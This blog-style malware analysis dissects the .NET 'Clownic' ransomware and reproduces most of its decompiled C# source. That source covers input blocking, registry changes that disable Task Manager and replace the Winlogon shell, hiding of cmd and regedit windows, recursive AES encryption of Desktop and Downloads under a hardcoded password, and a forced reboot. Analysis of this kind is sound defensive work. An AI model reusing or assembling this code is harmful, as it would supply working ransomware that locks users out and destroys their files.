---
title: Clownic Ransomware Analysis
description: Analysis of the .NET Clownic Ransomware
tags: Ransomware .NET
---

# Clownic Ransomware Analysis

.NET Ransomware using Windows Forms for ransom banner

[Sample](https://samples.vx-underground.org/samples/Families/ClownicRansomware/)

[VirusTotal Analysis](https://www.virustotal.com/gui/file/880823dd9df0ca6047cd829a1031e8a167ccec0629fdeac40a097dd555debf7c)

MD5 - 711486a19e8b011528dee34a5d25776e

## Analysis

The constructor has default `InitializeComponent` call that initialize some resources from program (e.g. font name, font size, etc.) and assigning the text to the `label2` times in 60 minutes

```csharp
public Ransomware2()
{
  this.InitializeComponent();
  this.label2.Text = TimeSpan.FromMinutes(60.0).ToString();
}
```

Also at the beginning of the class 2 extern methods are used `ShowWindow` and `BlockInput`

> The extern modifier is used to declare a method with an external implementation

```csharp
[DllImport("User32")]
private static extern int ShowWindow(int hwnd, int nCmdShow);

[DllImport("user32.dll")]
private static extern bool BlockInput(bool block);
```

The interesting things begin in `Ransomware2_Load`. This method occurs before a form is displayed for the first time.

It blocks mouse input:

```csharp
Ransomware2.FreezeMouse();
```

```csharp
public static void FreezeMouse()
{
  Ransomware2.BlockInput(true);
}
```

Then it disables the Task Manager, changes the wallpaper and changes the default `Shell` with explorer.exe on ... it is not clear what, because here it is replaced, I can assume that the exe of the ransomware itself.

```csharp
RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
registryKey2.SetValue("Wallpaper", "", RegistryValueKind.String);
RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
registryKey3.SetValue("Shell", "empty", RegistryValueKind.String);
```

Ok, then it delete all hidden files from the desktop (for what?)

```csharp
string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
string[] array = (from f in Directory.EnumerateFiles(folderPath + "\\")
where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
select f).ToArray<string>();

foreach (string path in array)
{
  File.Delete(path);
}
```

Just a timer that is displayed on the ransomware banner
```csharp
DateTime startTime = DateTime.Now;

Timer timer = new Timer
{
  Interval = 1000
};
timer.Tick += delegate(object obj, EventArgs args)
{
  this.label2.Text = (TimeSpan.FromMinutes(60.0) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss");
};

timer.Enabled = true;
```

And here we enter the ransomware himself and start 5 timers 
```csharp
this.tmr_hide.Start();
this.tmr_show.Start();
this.tmr_if.Start();
this.tmr_encrypt.Start();
this.tmr_clock.Start();
```

`tmr_hide_Tick` stops `tmr_hide` timer, sets size and location of base and unblocks mouse
```csharp
private void tmr_hide_Tick(object sender, EventArgs e)
{
  this.tmr_hide.Stop();
  base.Opacity = 100.0;
  base.Size = new Size(701, 584);
  base.Location = new Point(500, 500);
  Ransomware2.Thawouse();
}
 ```
 
```csharp
public static void Thawouse()
{
  Ransomware2.BlockInput(false);
}
```

`tmr_show_Tick` stops `tmr_show` timer, gets `Desktop` folder  + `desktop.ini` and deletes it, than deletes `desktop.ini` from the `%USERPROFILE%/Downloads/desktop.ini`. (can someone explain to me for what purpose?)

```csharp
private void tmr_show_Tick(object sender, EventArgs e)
{
  this.tmr_show.Stop();
  string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
  string path = folderPath + "\\desktop.ini";
  File.Delete(path);
  string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
  string str = Path.Combine(environmentVariable, "Downloads");
  string path2 = str + "\\desktop.ini";
  File.Delete(path2);
}
```

`tmr_if_Tick` is more interesting than previous methods. It stops `tmr_if` timer, gets processes with `GetProcesses()`. Then iterate through this processes and search for `cmd`, `regedit`, `processhacker`, `sdclt` and if one of them is found, it hides them. At the end of the method, it starts the timer again

```csharp
private void tmr_if_Tick(object sender, EventArgs e)
{
  this.tmr_if.Stop();
  Process[] processes = Process.GetProcesses();
  foreach (Process process in processes)
  {
    bool flag = process.ProcessName == "cmd";
    if (flag)
    {
      int hwnd = process.MainWindowHandle.ToInt32();
      Ransomware2.ShowWindow(hwnd, 0);
    }
    
    bool flag2 = process.ProcessName == "regedit";
    
    if (flag2)
    {
      int hwnd = process.MainWindowHandle.ToInt32();
      Ransomware2.ShowWindow(hwnd, 0);
    }
    
    bool flag3 = process.ProcessName == "Processhacker";
    
    if (flag3)
    {
      int hwnd = process.MainWindowHandle.ToInt32();
      Ransomware2.ShowWindow(hwnd, 0);
    }
    
    bool flag4 = process.ProcessName == "sdclt";
    if (flag4)
    {
      int hwnd = process.MainWindowHandle.ToInt32();
      Ransomware2.ShowWindow(hwnd, 0);
    }  
  }
  this.tmr_if.Start();
}
```

`tmr_encrypt_Tick` stops `tmr_encrypt` timer and calls `Start_Encrypt` method

```csharp
private void tmr_encrypt_Tick(object sender, EventArgs e)
{
  this.tmr_encrypt.Stop();
  Ransomware2.Start_Encrypt();
}
```

`Starts_Encrypt` is function, that retrieves a list of files and calls a method `EncryptFile` that encrypts files.

The methods gets desktop folder, `USERPROFILE` environment variable, that contains user's home directory and combine it with Downloads (`%USERPROFILE%\Downloads`).

Then it makes up 2 arrays with files from desktop and downloads folders with. Also it contains `SearchOption.AllDirectories` which means including the current directory and all subdirectories.

And then encrypts files with password. Password is used as static symmetric key for encryption algorithm.

```csharp
private static void Start_Encrypt()
{
  string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
  string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
  string str = Path.Combine(environmentVariable, "Downloads");
  string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
  string[] files2 = Directory.GetFiles(str + "\\", "*", SearchOption.AllDirectories);
  Ransomware2.EncryptionFile encryptionFile = new Ransomware2.EncryptionFile();
  string password = "Clownic_Ransomware";
  for (int i = 0; i < files.Length; i++)
  {
    encryptionFile.EncryptFile(files[i], password);
  }
  for (int j = 0; j < files2.Length; j++)
  {
    encryptionFile.EncryptFile(files2[j], password);
  }
}
```

`EncryptFile` just uses SHA256 to encrypt the bytes of file with password and then writes encrypted bytes to the target file

```csharp
public class EncryptionFile
{
  public void EncryptFile(string file, string password)
  {
    byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
    byte[] array = Encoding.UTF8.GetBytes(password);
    array = SHA256.Create().ComputeHash(array);
    byte[] bytes = Ransomware2.CoreEncryption.AES_Encrypt(bytesToBeEncrypted, array);
    File.WriteAllBytes(file, bytes);
  }
}
```

`tmr_clock_Tick` stops `tmr_clock` timer, gets the process of itself and reboot the system.

```csharp
private void tmr_clock_Tick(object sender, EventArgs e)
{
  this.tmr_clock.Stop();
  Process[] processesByName = Process.GetProcessesByName("ClownicRansomware1.0");
  foreach (Process process in processesByName)
  {
    Process.Start("shutdown", "/r /t 0");
    process.Kill();
  }
  base.Close();
}
```

`OFF_Encrypt` is a mirror function for `Start_Encrypt`

```csharp
private static void OFF_Encrypt()
{
  string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
  string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
  string str = Path.Combine(environmentVariable, "Downloads");
  string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
  string[] files2 = Directory.GetFiles(str + "\\", "*", SearchOption.AllDirectories);
  Ransomware2.DecryptionFile decryptionFile = new Ransomware2.DecryptionFile();
  string password = "Clownic_Ransomware";
  for (int i = 0; i < files.Length; i++)
  {
    decryptionFile.DecryptFile(files[i], password);
  }
  for (int j = 0; j < files2.Length; j++)
  {
    decryptionFile.DecryptFile(files2[j], password);
  }
}
```

`AES_Encrypt` just defines salt and other settings for the obsolete `RijndaelManaged`.

Settings:
- KeySize = 256
- BlockSite = 128
- Mode = CBC

```csharp
public class CoreEncryption
{
  public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
  {
    byte[] result = null;
    byte[] salt = new byte[]
    {
      1,
      2,
      3,
      4,
      5,
      6,
      7,
      8
    };
    
    using (MemoryStream memoryStream = new MemoryStream())
    {
      using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
      {
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
        rijndaelManaged.Mode = CipherMode.CBC;
        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
        {
          cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
          cryptoStream.Close();
        }
        result = memoryStream.ToArray();
      }
    }
    return result;
  }
}
```

`CoreDecryption` mirrored to `CoreEncryption`

```csharp
public class CoreDecryption
{
  public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
  {
    byte[] result = null;
    byte[] salt = new byte[]
    {
      1,
      2,
      3,
      4,
      5,
      6,
      7,
      8
    };
    
    using (MemoryStream memoryStream = new MemoryStream())
    {
      using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
      {
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
        rijndaelManaged.Mode = CipherMode.CBC;
        
        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
        {
          cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
          cryptoStream.Close();
        }
        
        result = memoryStream.ToArray();
       }
    }
    return result;
  }
}

```

## Few Words
My review, from the side of performing actions as ransomware, it will work and that's good, but from the coder's side, the code is shit
